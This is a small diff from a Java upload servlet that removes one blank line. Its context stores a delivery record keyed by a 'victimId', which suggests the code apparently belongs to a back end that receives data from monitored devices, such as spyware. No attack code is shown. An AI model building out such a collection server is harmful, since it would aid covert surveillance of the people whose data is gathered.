@@ -94,7 +94,6 @@ public class UploadServlet extends AdvancedBaseServlet {
                 //What ever the data_type, adding delivery;
                 deliveries.addv2(new Delivery(victimId, false, message, dataType, -1));
 
-
             } else {
                 final String errorMessage = KEY_DATA + " is missing";
 
